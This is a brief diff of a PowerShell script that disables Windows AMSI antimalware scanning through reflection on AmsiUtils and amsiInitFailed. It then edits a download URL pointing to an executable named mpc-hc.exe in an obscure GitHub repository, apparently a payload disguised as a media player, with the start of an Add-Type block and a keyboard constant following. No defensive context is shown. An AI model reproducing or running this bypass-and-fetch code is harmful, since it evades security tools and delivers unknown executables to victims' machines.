@@ -10,7 +10,7 @@ $a=[Ref].Assembly.GetTypes()|Where-Object {$_.Name -like "*AmsiUtils*"}
 $b=$a.GetFields('NonPublic,Static')|Where-Object {$_.Name -like "*amsiInitFailed*"}
 $b.SetValue($null,$true)
 
-$url = "https://raw.githubusercontent.com/kvn9asid9i8a/kkkk/refs/heads/main/mpc-hc.exe"
+$url = "https://raw.githubusercontent.com/kvn9asid9i8a/kkkk/main/mpc-hc.exe"
 $VK_OPEN_BRACKET = 0xDB
 
 Add-Type -TypeDefinition @"
